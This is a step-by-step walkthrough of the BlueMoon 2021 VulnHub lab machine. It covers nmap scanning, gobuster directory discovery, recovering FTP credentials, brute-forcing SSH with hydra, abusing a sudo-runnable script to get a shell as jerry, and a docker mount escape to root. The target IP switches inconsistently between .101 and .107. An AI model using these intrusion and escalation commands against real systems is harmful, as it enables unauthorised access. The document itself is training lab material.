# BlueMoon-2021-VulnHub-Walkthrough

A step-by-step lab guide for the BlueMoon 2021 VulnHub machine.

---

## 🖥️ Setup

- Download the machine from [VulnHub](https://www.vulnhub.com/entry/bluemoon-2021,679/)
- Import and start it in **VirtualBox**

---

## Step 1 — Find Your IP

```bash
ifconfig
```

> Note your attacker machine's IP address (`192.168.56.102`)

---

## Step 2 — Discover Target on Network

```bash
nmap -sP 192.168.56.0/24
```

> Identify the BlueMoon machine IP (`192.168.56.101`)

---

## Step 3 — Port Scan

```bash
nmap 192.168.56.101
```

**Open ports found:**
| Port | Service |
|------|---------|
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

---

## Step 4 — Web HTTP

Visit `http://192.168.56.101` in your browser. Nothing useful found.

Run Gobuster to find hidden directories:

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> Found: `/hidden_text`

---

## Step 5 — Explore Hidden Directory

- Go to `http://192.168.56.107/hidden_text`
- Click the **"Thank you…"** link
- A **QR code image** will appear — download it

Decode the QR code at [https://zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx)

**Credentials found:**
```
USER: userftp
PASSWORD: ftpp@ssword
```

---

## Step 6 — Login via FTP

```bash
ftp 192.168.56.107
```

List and download files:

```bash
ls
get information.txt
get p_lists.txt
```

Read the files:

```bash
cat information.txt
cat p_lists.txt
```

> `information.txt` reveals a username: **robin**  
> `p_lists.txt` is a password list

---

## Step 7 — Brute Force SSH with Hydra

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.101
```

**Credentials found:**
```
Login: robin
Password: k4rv3ndh4nh4ck3r
```

---

## Step 8 — SSH Login & First Flag

```bash
ssh robin@192.168.56.101
```

```bash
ls -al
cat user1.txt
```

> 🚩 **Flag 1 obtained!**

---

## Step 9 — Privilege Escalation to Jerry

```bash
sudo -l
```

> `feedback.sh` can be run as user **jerry**

```bash
cd project
ls
cat feedback.sh
```

Run the script as jerry:

```bash
sudo -u jerry /home/robin/project/feedback.sh
```

- When prompted for **name**, type: `jerry`
- When prompted for **feedback**, type: `/bin/bash`

```bash
ls
pwd
cd /home/jerry
ls
cat user2.txt
```

> 🚩 **Flag 2 obtained!**

---

## Step 10 — Escalate to Root via Docker

Upgrade to interactive shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Check group membership:

```bash
id
```

> User **jerry** is in the **docker** group

List available Docker images:

```bash
docker image ls
```

Exploit the Alpine image to get root:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```bash
id
cd /root
ls -al
cat root.txt
```

> 🚩 **Root flag obtained! Machine pwned!**

